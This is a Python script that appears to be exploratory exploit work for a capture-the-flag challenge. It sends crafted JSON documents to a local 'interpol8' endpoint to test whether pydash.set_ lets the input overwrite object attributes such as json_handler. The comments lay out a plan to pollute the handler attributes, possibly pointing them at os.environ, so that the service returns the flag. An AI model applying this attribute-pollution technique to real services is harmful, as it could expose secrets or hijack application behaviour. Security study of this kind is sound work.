#!/usr/bin/env python3
import requests

URL = "http://localhost:6969/interpol8"

# The vulnerability: pydash.set_ allows prototype pollution
# We can set arbitrary attributes on the DataHolder object
# Since json_handler, yaml_handler, xml_handler are class attributes,
# maybe we can overwrite them?

# Key observation: __get_dict__ filters them out, but that's only for OUTPUT
# For INPUT, _setitems uses pydash.set_ which can set ANY attribute

# Let's try to understand the flow:
# 1. holder1 is created with default handlers
# 2. from_json/yaml/xml is called, which calls _setitems
# 3. _setitems uses pydash.set_ to set attributes
# 4. holder2 is created and does the same  
# 5. holder1.merge(holder2) merges holder2's dict into holder1
# 6. to_json/yaml/xml is called, which uses the handler

# The trick: if we can make json_handler.dumps return the flag...
# Or better: make json_handler itself be os.environ!

print("=== Test: Check what pydash.set_ can do ===")

# Can we set a nested attribute that starts with a regular key?
# For example: {"x": {"__class__": "test"}}
payload = {
    "doc1": '{"x": {"y": "value"}}',
    "doc2": '{"dummy": "data"}',
    "type1": "json",
    "type2": "json",
    "return_type": "json"
}

response = requests.post(URL, json=payload)
print(f"Status: {response.status_code}")
print(f"Response: {response.text}\n")

# Now let's check the logs to see if nested objects work
print("=== Test 2: Deeply nested ===")
payload = {
    "doc1": '{"a": {"b": {"c": "deep"}}}',
    "doc2": '{"dummy": "data"}',
    "type1": "json",
    "type2": "json",
    "return_type": "json"
}

response = requests.post(URL, json=payload)
print(f"Status: {response.status_code}")
print(f"Response: {response.text}\n")

# The handlers are filtered in __get_dict__, but what if we access them through a different path?
# Looking at line 49: return self.json_handler.dumps(self.__get_dict__())
# json_handler is accessed as self.json_handler
# If we could somehow make json_handler.dumps be something we control...

# Wait! What if we create a json_handler attribute that's different from the class attribute?
print("=== Test 3: Instance vs class attribute ===")
payload = {
    "doc1": '{"json_handler": {"dumps": "custom_dumps"}}',
    "doc2": '{"dummy": "data"}',
    "type1": "json",
    "type2": "json",
    "return_type": "json"
}

response = requests.post(URL, json=payload)
print(f"Status: {response.status_code}")
print(f"Response: {response.text}\n")
